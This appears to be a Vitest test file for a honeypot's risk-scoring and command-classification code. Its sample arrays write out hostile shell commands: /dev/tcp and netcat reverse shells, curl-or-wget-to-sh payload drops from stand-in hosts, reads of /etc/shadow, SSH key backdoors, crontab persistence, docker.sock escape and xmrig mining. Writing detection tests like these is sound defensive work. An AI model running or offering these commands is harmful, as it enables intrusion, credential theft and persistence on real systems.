import { describe, expect, it } from 'vitest'
import { computeRiskScore, classifyCommands, deriveThreatTags } from '../src/lib/risk-score.js'

describe('computeRiskScore', () => {
  it('still allows a single severe SSH actor to reach 100', () => {
    const result = computeRiskScore({
      sshSessions: 1,
      sshAuthAttempts: 48,
      sshLoginSuccess: true,
      commands: [
        'echo ssh-rsa AAAA > ~/.ssh/authorized_keys',
        'crontab -l',
        'wget http://bad.example/payload.sh -O /tmp/.x && chmod +x /tmp/.x',
        'cat /etc/shadow',
      ],
      webHits: 0,
      webAttackTypes: [],
      protocolsSeen: ['ssh'],
      protocolAuthAttempts: 0,
      protocolCommandCount: 0,
      protocolConnectCount: 0,
      protocolUniquePorts: 0,
      credentialReuse: false,
      timeWindowMinutes: 2,
    })

    expect(result.score).toBe(100)
    expect(result.level).toBe('CRITICAL')
    expect(result.breakdown.ssh).toBeGreaterThan(0)
    expect(result.breakdown.commands).toBeGreaterThan(0)
    expect(result.breakdown.crossProto).toBe(0)
  })

  it('adds correlation points for multi-service behavior without depending on SSH', () => {
    const result = computeRiskScore({
      sshSessions: 0,
      sshAuthAttempts: 0,
      sshLoginSuccess: false,
      commands: [],
      webHits: 2,
      webAttackTypes: ['scanner', 'sqli'],
      protocolsSeen: ['http', 'ftp', 'mysql', 'port-scan'],
      protocolAuthAttempts: 6,
      protocolCommandCount: 1,
      protocolConnectCount: 9,
      protocolUniquePorts: 4,
      credentialReuse: true,
      timeWindowMinutes: 4,
    })

    expect(result.breakdown.web).toBeGreaterThan(0)
    expect(result.breakdown.protocols).toBeGreaterThan(0)
    expect(result.breakdown.crossProto).toBeGreaterThan(0)
    expect(result.score).toBeGreaterThan(40)
  })
})

describe('classifyCommands', () => {
  it('matches each category against its representative payload', () => {
    const samples: Record<string, string> = {
      ssh_backdoor: 'echo ssh-rsa AAAAB3NzaC1yc2EAAAA >> ~/.ssh/authorized_keys',
      honeypot_evasion: 'ls /var/spool/sms',
      container_escape: 'cat /proc/1/cgroup',
      reverse_shell: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
      malware_drop: 'wget https://bad.example/x.sh && chmod +x /tmp/x.sh',
      persistence: 'useradd -m sysadm',
      lateral_movement: 'nmap -sS 10.0.0.0/24',
      crypto_mining: 'xmrig -o pool.minexmr.com:4444',
      data_exfil: 'cat /etc/passwd',
      solana_targeting: 'solana-validator --identity id.json',
      recon: 'whoami',
    }

    for (const [category, cmd] of Object.entries(samples)) {
      const result = classifyCommands([cmd])
      expect(result[category as keyof typeof result], `expected "${cmd}" to match ${category}`).toContain(cmd)
    }
  })

  it('matches the hardened Task-7 pattern additions', () => {
    const samples: Array<[string, string]> = [
      ['ssh_backdoor', 'echo "ssh-ed25519 AAAAC3Nza x" | tee -a /root/.ssh/authorized_keys'],
      ['honeypot_evasion', '/bin/busybox ECCHI'],
      ['container_escape', 'curl --unix-socket /var/run/docker.sock http://x/containers/json'],
      ['reverse_shell', 'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f'],
      ['reverse_shell', 'python3 -c "import socket,os,pty"'],
      ['malware_drop', 'curl http://1.2.3.4/a.sh | sh'],
      ['malware_drop', 'echo ZWNobyBoaQ== | base64 -d | sh'],
      ['malware_drop', 'wget http://1.2.3.4/bot.mips'],
      ['crypto_mining', 'xmrig --donate-level 1 -o c3pool.com:4444'],
      ['data_exfil', 'export HISTFILE=/dev/null'],
      ['persistence', 'echo "@reboot /root/backdoor" >> /etc/crontab'],
    ]

    for (const [category, cmd] of samples) {
      const result = classifyCommands([cmd])
      expect(result[category as keyof typeof result], `expected "${cmd}" to match ${category}`).toContain(cmd)
    }
  })

  it('treats `crontab -l` as recon, not persistence (listing is not modifying)', () => {
    const result = classifyCommands(['crontab -l'])
    expect(result.recon).toContain('crontab -l')
    expect(result.persistence).toHaveLength(0)
  })

  it('rejects benign lookalikes', () => {
    const benign = ['ls -la', 'cd /home/user', 'echo hello world', 'cat notes.txt']
    for (const cmd of benign) {
      const result = classifyCommands([cmd])
      const matchedAny = Object.values(result).some(cmds => cmds.includes(cmd))
      expect(matchedAny, `expected "${cmd}" to match nothing`).toBe(false)
    }
  })
})

describe('deriveThreatTags (parity with classifyCommands — single source of truth)', () => {
  it('emits a tag whenever classifyCommands finds a match for that category', () => {
    const corpus = [
      'chattr -R -ia ~/.ssh/authorized_keys',
      'wget http://bad.example/payload.sh',
      'chmod +x /tmp/payload.sh',
      'useradd -m backdoor',
      'cat /etc/passwd',
      'xmrig -o pool.minexmr.com:4444',
      'solana-validator --identity id.json',
      'ls /var/spool/sms',
      'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
    ]
    const cats = classifyCommands(corpus)
    const tags = deriveThreatTags(corpus)

    for (const tag of ['ssh_backdoor', 'malware_drop', 'persistence', 'data_exfil', 'crypto_mining', 'solana_targeting', 'honeypot_evasion', 'reverse_shell'] as const) {
      expect(cats[tag].length, `classifyCommands should have matched ${tag}`).toBeGreaterThan(0)
      expect(tags, `deriveThreatTags should surface ${tag}`).toContain(tag)
    }
  })

  it('emits no tags for benign commands', () => {
    expect(deriveThreatTags(['ls', 'pwd', 'echo hi'])).toEqual([])
  })

  it('does not emit lateral_movement or recon (not part of the session threatTags taxonomy)', () => {
    const tags = deriveThreatTags(['nmap -sS 10.0.0.0/24', 'whoami'])
    expect(tags).not.toContain('lateral_movement')
    expect(tags).not.toContain('recon')
  })
})
